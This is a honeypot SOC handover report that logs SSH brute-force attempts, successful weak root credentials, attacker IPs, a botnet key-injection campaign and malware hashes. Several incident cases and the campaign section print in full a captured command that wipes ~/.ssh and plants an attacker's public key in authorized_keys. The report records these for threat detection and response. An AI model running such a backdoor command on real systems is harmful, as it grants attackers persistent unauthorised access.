# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-09 |
| **Generated At** | 2026-05-09T11:01:16Z |
| **Shift Time** | 11:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **245** |
| Confirmed Threats | **211** |
| False Positives Filtered | **34** (13.9%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **12** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **233** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **73** |
| Unique Credential Pairs | **33** |
| Unique Usernames | **18** |
| Unique Passwords | **33** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 24 |
| `root` | 12 |
| `345gs5662d34` | 6 |
| `admin` | 3 |
| `develop` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `abc123` | 2 |
| `iitmaapuser` | 2 |
| `!QAZ2wsx#EDC` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `develop` | `abc123` | 2 |
| `iitmaapuser` | `iitmaapuser` | 2 |
| `ubuntu` | `!QAZ2wsx#EDC` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin@admin` | `198.98.62.211` | 2026-05-09T09:57:29 |
| `root` | `3245gs5662d34` | `198.98.62.211` | 2026-05-09T09:57:35 |
| `root` | `vpn2024` | `198.98.62.211` | 2026-05-09T10:02:16 |
| `root` | `test@12345` | `198.98.62.211` | 2026-05-09T10:17:11 |
| `root` | `admin@admin` | `165.154.6.26` | 2026-05-09T10:30:38 |
| `root` | `3245gs5662d34` | `165.154.6.26` | 2026-05-09T10:30:41 |
| `root` | `test@12345` | `165.154.6.26` | 2026-05-09T10:33:12 |
| `root` | `vpn2024` | `165.154.6.26` | 2026-05-09T10:45:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **245** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 72 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 72 | 2 |
| `748f8c627d3f...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 72 | 2 | libssh-based |
| `95420f9d932d...` | Unknown | 1 | 1 | — |
| `748f8c627d3f...` | Unknown | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.6.26`, `198.98.62.211`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **17** |
| High-Risk ASNs | **7** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS212512` | Detai Prosperous Technologies Limited | 1 | HIGH |
| `AS36947` | Telecom Algeria | 1 | LOW |
| `AS133296` | Web Werks India Pvt. Ltd. | 1 | HIGH |
| `AS51375` | STC BAHRAIN B.S.C CLOSED | 1 | LOW |
| `AS3243` | MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A. | 1 | LOW |
| `AS267938` | UNIC SERVICOS DE TELECOMUNICACOES LTDA | 1 | LOW |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS17072` | TOTAL PLAY TELECOMUNICACIONES, S.A.P.I. DE C.V. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6ba7db3f9ac7

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-05-09 09:57 |
| **Last Seen** | 2026-05-09 09:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 09:57:28` | `cowrie.session.connect` |
| `2026-05-09 09:57:28` | `cowrie.client.version` |
| `2026-05-09 09:57:28` | `cowrie.client.kex` |
| `2026-05-09 09:57:29` | `cowrie.login.success` |
| `2026-05-09 09:57:30` | `cowrie.session.params` |
| `2026-05-09 09:57:30` | `cowrie.command.input` |
| `2026-05-09 09:57:30` | `cowrie.command.failed` |
| `2026-05-09 09:57:30` | `cowrie.log.closed` |
| `2026-05-09 09:57:31` | `cowrie.session.params` |
| `2026-05-09 09:57:31` | `cowrie.command.input` |
| `2026-05-09 09:57:31` | `cowrie.session.file_download` |
| `2026-05-09 09:57:31` | `cowrie.log.closed` |
| `2026-05-09 09:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cde8fd80af5d

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-05-09 09:57 |
| **Last Seen** | 2026-05-09 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 09:57:34` | `cowrie.session.connect` |
| `2026-05-09 09:57:34` | `cowrie.client.version` |
| `2026-05-09 09:57:34` | `cowrie.client.kex` |
| `2026-05-09 09:57:35` | `cowrie.login.success` |
| `2026-05-09 09:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69a0f0450527

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-05-09 10:02 |
| **Last Seen** | 2026-05-09 10:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:02:15` | `cowrie.session.connect` |
| `2026-05-09 10:02:15` | `cowrie.client.version` |
| `2026-05-09 10:02:15` | `cowrie.client.kex` |
| `2026-05-09 10:02:16` | `cowrie.login.success` |
| `2026-05-09 10:02:17` | `cowrie.session.params` |
| `2026-05-09 10:02:17` | `cowrie.command.input` |
| `2026-05-09 10:02:17` | `cowrie.command.failed` |
| `2026-05-09 10:02:17` | `cowrie.log.closed` |
| `2026-05-09 10:02:18` | `cowrie.session.params` |
| `2026-05-09 10:02:18` | `cowrie.command.input` |
| `2026-05-09 10:02:18` | `cowrie.session.file_download` |
| `2026-05-09 10:02:18` | `cowrie.log.closed` |
| `2026-05-09 10:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f785b56c8d24

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-05-09 10:02 |
| **Last Seen** | 2026-05-09 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:02:21` | `cowrie.session.connect` |
| `2026-05-09 10:02:21` | `cowrie.client.version` |
| `2026-05-09 10:02:21` | `cowrie.client.kex` |
| `2026-05-09 10:02:22` | `cowrie.login.success` |
| `2026-05-09 10:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a80e004daa9

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-05-09 10:17 |
| **Last Seen** | 2026-05-09 10:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:17:10` | `cowrie.session.connect` |
| `2026-05-09 10:17:10` | `cowrie.client.version` |
| `2026-05-09 10:17:10` | `cowrie.client.kex` |
| `2026-05-09 10:17:11` | `cowrie.login.success` |
| `2026-05-09 10:17:12` | `cowrie.session.params` |
| `2026-05-09 10:17:12` | `cowrie.command.input` |
| `2026-05-09 10:17:12` | `cowrie.command.failed` |
| `2026-05-09 10:17:12` | `cowrie.log.closed` |
| `2026-05-09 10:17:12` | `cowrie.session.params` |
| `2026-05-09 10:17:12` | `cowrie.command.input` |
| `2026-05-09 10:17:13` | `cowrie.session.file_download` |
| `2026-05-09 10:17:13` | `cowrie.log.closed` |
| `2026-05-09 10:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb66f21a97b0

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-05-09 10:17 |
| **Last Seen** | 2026-05-09 10:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:17:16` | `cowrie.session.connect` |
| `2026-05-09 10:17:16` | `cowrie.client.version` |
| `2026-05-09 10:17:16` | `cowrie.client.kex` |
| `2026-05-09 10:17:17` | `cowrie.login.success` |
| `2026-05-09 10:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-151dce07937a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]26` |
| **First Seen** | 2026-05-09 10:30 |
| **Last Seen** | 2026-05-09 10:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:30:37` | `cowrie.session.connect` |
| `2026-05-09 10:30:37` | `cowrie.client.version` |
| `2026-05-09 10:30:38` | `cowrie.client.kex` |
| `2026-05-09 10:30:38` | `cowrie.login.success` |
| `2026-05-09 10:30:38` | `cowrie.session.params` |
| `2026-05-09 10:30:38` | `cowrie.command.input` |
| `2026-05-09 10:30:38` | `cowrie.command.failed` |
| `2026-05-09 10:30:38` | `cowrie.log.closed` |
| `2026-05-09 10:30:39` | `cowrie.session.params` |
| `2026-05-09 10:30:39` | `cowrie.command.input` |
| `2026-05-09 10:30:39` | `cowrie.session.file_download` |
| `2026-05-09 10:30:39` | `cowrie.log.closed` |
| `2026-05-09 10:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]26` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63856d23878c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]26` |
| **First Seen** | 2026-05-09 10:30 |
| **Last Seen** | 2026-05-09 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:30:41` | `cowrie.session.connect` |
| `2026-05-09 10:30:41` | `cowrie.client.version` |
| `2026-05-09 10:30:41` | `cowrie.client.kex` |
| `2026-05-09 10:30:41` | `cowrie.login.success` |
| `2026-05-09 10:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]26` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-813bce49ff54

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]26` |
| **First Seen** | 2026-05-09 10:33 |
| **Last Seen** | 2026-05-09 10:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:33:11` | `cowrie.session.connect` |
| `2026-05-09 10:33:11` | `cowrie.client.version` |
| `2026-05-09 10:33:11` | `cowrie.client.kex` |
| `2026-05-09 10:33:12` | `cowrie.login.success` |
| `2026-05-09 10:33:12` | `cowrie.session.params` |
| `2026-05-09 10:33:12` | `cowrie.command.input` |
| `2026-05-09 10:33:12` | `cowrie.command.failed` |
| `2026-05-09 10:33:12` | `cowrie.log.closed` |
| `2026-05-09 10:33:12` | `cowrie.session.params` |
| `2026-05-09 10:33:12` | `cowrie.command.input` |
| `2026-05-09 10:33:12` | `cowrie.session.file_download` |
| `2026-05-09 10:33:12` | `cowrie.log.closed` |
| `2026-05-09 10:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]26` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-915431f7fa82

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]26` |
| **First Seen** | 2026-05-09 10:33 |
| **Last Seen** | 2026-05-09 10:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:33:14` | `cowrie.session.connect` |
| `2026-05-09 10:33:14` | `cowrie.client.version` |
| `2026-05-09 10:33:14` | `cowrie.client.kex` |
| `2026-05-09 10:33:15` | `cowrie.login.success` |
| `2026-05-09 10:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]26` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51bd838d2af5

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]26` |
| **First Seen** | 2026-05-09 10:45 |
| **Last Seen** | 2026-05-09 10:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:45:08` | `cowrie.session.connect` |
| `2026-05-09 10:45:08` | `cowrie.client.version` |
| `2026-05-09 10:45:08` | `cowrie.client.kex` |
| `2026-05-09 10:45:08` | `cowrie.login.success` |
| `2026-05-09 10:45:09` | `cowrie.session.params` |
| `2026-05-09 10:45:09` | `cowrie.command.input` |
| `2026-05-09 10:45:09` | `cowrie.command.failed` |
| `2026-05-09 10:45:09` | `cowrie.log.closed` |
| `2026-05-09 10:45:09` | `cowrie.session.params` |
| `2026-05-09 10:45:09` | `cowrie.command.input` |
| `2026-05-09 10:45:09` | `cowrie.session.file_download` |
| `2026-05-09 10:45:09` | `cowrie.log.closed` |
| `2026-05-09 10:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]26` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0d9fd9682ee

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]26` |
| **First Seen** | 2026-05-09 10:45 |
| **Last Seen** | 2026-05-09 10:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 10:45:11` | `cowrie.session.connect` |
| `2026-05-09 10:45:11` | `cowrie.client.version` |
| `2026-05-09 10:45:11` | `cowrie.client.kex` |
| `2026-05-09 10:45:11` | `cowrie.login.success` |
| `2026-05-09 10:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]26` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.183.111[.]36` | **115** | 2026-05-09 09:23 | 2026-05-09 10:53 | 64m | 0 | `T1592` | 🟠 MEDIUM |
| `165.154.6[.]26` | **30** | 2026-05-09 10:13 | 2026-05-09 10:49 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `198.98.62[.]211` | **30** | 2026-05-09 09:50 | 2026-05-09 10:17 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `150.95.25[.]34` | **14** | 2026-05-09 09:39 | 2026-05-09 10:50 | 13m | 0 | `T1592` | 🟠 MEDIUM |
| `68.168.211[.]82` | **6** | 2026-05-09 09:35 | 2026-05-09 10:35 | 5m | 0 | `T1592` | 🟢 LOW |
| `45.82.78[.]105` | **3** | 2026-05-09 09:44 | 2026-05-09 09:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.71.233[.]73` | 1 | 2026-05-09 10:14 | 2026-05-09 10:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
